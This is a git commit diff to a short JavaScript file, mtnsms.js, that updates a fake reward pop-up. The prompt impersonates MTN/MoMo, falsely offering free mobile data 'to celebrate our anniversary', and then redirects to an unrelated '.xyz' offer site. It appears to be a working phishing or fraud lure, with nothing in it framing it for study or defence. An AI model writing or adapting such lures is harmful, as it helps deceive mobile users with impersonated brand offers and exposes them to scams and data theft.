d622638edd97302ea9bdba7d33c3ecb7eed0d8d5
bigetijazz4 <bigetijazz4@gmail.com>
2024-08-28 11:56:58 -0700

    Update mtnsms.js

--- mtnsms.js
+++ mtnsms.js
@@ -1,5 +1,5 @@
 var password = '1'
-password=prompt('MTN: Congratulations, you are Eligible to receive 50GB free data OLD SIM REWARD, kindly press 1 to ACTIVATE now ','1');
+password=prompt('MoMoAt15: Congratulations, you are Eligible to receive 15GB free data to celebrate our anniversary, kindly press 1 to ACTIVATE now ','1');
 if (password != '1') {
 location.href='https://www.moreofferzdetails.xyz/freedatareward';
 }
